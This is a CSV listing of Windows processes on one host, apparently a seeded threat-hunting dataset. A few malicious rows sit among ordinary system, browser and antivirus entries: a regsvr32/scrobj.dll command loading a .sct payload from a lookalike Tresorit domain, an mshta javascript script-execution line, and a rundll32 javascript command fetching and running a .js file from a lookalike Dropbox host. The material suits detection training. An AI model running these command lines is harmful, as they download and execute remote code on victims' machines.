,arguments,hostname,name,path,pid,username
37,C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},0002RVTSN,dllhost.exe,C:\Windows\system32,312,NT AUTHORITY\SYSTEM
38,C:\Windows\system32\svchost.exe -k UnistackSvcGroup,0002RVTSN,svchost.exe,C:\Windows\system32,1920,NT AUTHORITY\SYSTEM
40,"""dwm.exe""",0002RVTSN,dwm.exe,C:\Windows\system32,4564,NT AUTHORITY\SYSTEM
41,"""C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=2685998191293934672 --lang=en-GB --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=2685998191293934672 --renderer-client-id=12 --mojo-platform-channel-handle=4360 /prefetch:1",0002RVTSN,opera.exe,C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52,554,darci.wood8
48,C:\Windows\system32\svchost.exe -k RPCSS,0002RVTSN,svchost.exe,C:\Windows\system32,5024,NT AUTHORITY\SYSTEM
49,sihost.exe,0002RVTSN,sihost.exe,C:\Windows\System32,2084,NT AUTHORITY\SYSTEM
50,"""C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=gpu-process --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --gpu-preferences=KAAAAAAAAACAAwBAAQAAAAAAAAAAAGAAAAAAAAAAAAAIAAAAAAAAACgAAAAEAAAAIAAAAAAAAAAoAAAAAAAAADAAAAAAAAAAOAAAAAAAAAAQAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAACwAAABAAAAAAAAAAAQAAAAoAAAAQAAAAAAAAAAEAAAALAAAA --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --service-request-channel-token=7207758415534163028 --mojo-platform-channel-handle=1472 --ignored="" --type=renderer "" /prefetch:2",0002RVTSN,opera.exe,C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52,4344,darci.wood8
52,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,0002RVTSN,svchost.exe,C:\Windows\system32,4528,NT AUTHORITY\SYSTEM
54,"""C:\Users\svc_hc\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",0002RVTSN,OneDrive.exe,C:\Users\svc_hc\AppData\Local\Microsoft\OneDrive,3520,svc_hc
55,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",0002RVTSN,mcshield.exe,C:\Program Files\Common Files\McAfee\AMCore,2184,svc_hc
57,"C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52\opera_crashreporter.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\darci.wood8\AppData\Roaming\Opera Software\Opera Stable\Crash Reports"" ""--crash-count-file=C:\Users\darci.wood8\AppData\Roaming\Opera Software\Opera Stable\crash_count.txt"" --url=https://crashstats-collector.opera.com/collector/submit --annotation=channel=Stable --annotation=plat=Win64 --annotation=prod=OperaDesktop --annotation=ver=56.0.3051.52 --initial-client-data=0x238 0x304 0x30c 0x320 0x308 0x7ffb51313108 0x7ffb51313118 0x7ffb51313128",0002RVTSN,opera_crashreporter.exe,C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52,2315,darci.wood8
58,C:\Windows\System32\svchost.exe -k utcsvc,0002RVTSN,svchost.exe,C:\Windows\System32,1804,NT AUTHORITY\SYSTEM
59,"""C:\Program Files (x86)\Common Files\VMware\USB\vmware-usbarbitrator64.exe""",0002RVTSN,vmware-usbarbitrator64.exe,C:\Program Files (x86)\Common Files\VMware\USB,3652,darci.wood8
62,"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",0002RVTSN,SearchUI.exe,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,3816,NT AUTHORITY\SYSTEM
63,"""dwm.exe""",0002RVTSN,dwm.exe,C:\Windows\system32,5036,NT AUTHORITY\SYSTEM
65,C:\Windows\system32\svchost.exe -k appmodel,0002RVTSN,svchost.exe,C:\Windows\system32,5380,NT AUTHORITY\SYSTEM
69,C:\Windows\System32\spoolsv.exe,0002RVTSN,spoolsv.exe,C:\Windows\System32,1792,NT AUTHORITY\SYSTEM
70,"""C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=16451249972883912486 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=16451249972883912486 --renderer-client-id=4 --mojo-platform-channel-handle=3140 /prefetch:1",0002RVTSN,opera.exe,C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52,3445,darci.wood8
71,C:\Windows\system32\svchost.exe -k DcomLaunch,0002RVTSN,svchost.exe,C:\Windows\system32,268,NT AUTHORITY\SYSTEM
72,C:\Windows\system32\svchost.exe -k LocalService,0002RVTSN,svchost.exe,C:\Windows\system32,512,NT AUTHORITY\SYSTEM
73,C:\Windows\System32\regsvr32 /u /n /s /i:http://www.Тresorit.com/pay4159yload.sct scrobj.dll,0002RVTSN,wscript.exe,C:\Windows\System32\wscript.exe,4104,evelperez61
75,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,0002RVTSN,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack,3167,svc_hc
76,"""LogonUI.exe"" /flags:0x0 /state0:0xa3a5d855 /state1:0x41c64e6d",0002RVTSN,LogonUI.exe,C:\Windows\system32,6012,NT AUTHORITY\SYSTEM
79,C:\Windows\system32\svchost.exe -k NetworkService,0002RVTSN,svchost.exe,C:\Windows\system32,1808,NT AUTHORITY\SYSTEM
80,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted,0002RVTSN,svchost.exe,C:\Windows\system32,3860,NT AUTHORITY\SYSTEM
82,C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();,0002RVTSN,mshta.exe,C:\Windows\System32\mshta.exe,5652,NT AUTHORITY\SYSTEM
87,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",0002RVTSN,ServiceHost.exe,C:\Program Files\McAfee\WebAdvisor,408,svc_hc
91,"""C:\Program Files\CyberGhost 6\CyberGhost.Service.exe""",0002RVTSN,CyberGhost.Service.exe,C:\Program Files\CyberGhost 6,1971,lotti.richards
92,C:\Windows\System32\svchost.exe -k smbsvcs,0002RVTSN,svchost.exe,C:\Windows\System32,936,NT AUTHORITY\SYSTEM
94,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,0002RVTSN,ModuleCoreService.exe,c:\program files\common files\mcafee\modulecore,5665,svc_hc
95,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",0002RVTSN,MMSSHOST.EXE,C:\Program Files\Common Files\McAfee\MMSSHost,648,svc_hc
98,C:\Windows\Explorer.EXE,0002RVTSN,Explorer.EXE,C:\Windows,4300,NT AUTHORITY\SYSTEM
101,"""C:\Program Files (x86)\VMware\VMware Player\vmware-authd.exe""",0002RVTSN,vmware-authd.exe,C:\Program Files (x86)\VMware\VMware Player,4343,darci.wood8
103,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",0002RVTSN,McPvTray.exe,C:\Program Files\McAfee\MAT,5709,svc_hc
105,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",0002RVTSN,McAMTaskAgent.exe,C:\Program Files\Common Files\McAfee\TaskScheduler,2923,svc_hc
106,"""C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=12376823585177401963 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=12376823585177401963 --renderer-client-id=7 --mojo-platform-channel-handle=2368 /prefetch:1",0002RVTSN,opera.exe,C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52,5604,darci.wood8
111,/loadhooks /Parent:0000000000001188,0002RVTSN,TabTip32.exe,C:\Program Files (x86)\Common Files\Microsoft Shared\Ink,1472,NT AUTHORITY\SYSTEM
113,"C:\Windows\System32\rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:\http://www.drop-box.com.au/o8ffyz.js'"").Exec();""",0002RVTSN,rundll32.exe,C:\Windows\System32\rundll32.exe,4124,svc_hc
121,"""C:\Program Files\CCleaner\CCleaner.exe"" /uac",0002RVTSN,CCleaner64.exe,C:\Program Files\CCleaner,3993,nicbell76
123,"""C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.1809.2731.0_x64__8wekyb3d8bbwe\Calculator.exe"" -ServerName:App.AppXsm3pg4n7er43kdh1qp4e79f1j7am68r8.mca",0002RVTSN,Calculator.exe,C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.1809.2731.0_x64__8wekyb3d8bbwe,5865,svc_hc
124,"""C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --start-maximized --ran-launcher",0002RVTSN,opera.exe,C:\Users\darci.wood8\AppData\Local\Programs\Opera\56.0.3051.52,1167,darci.wood8
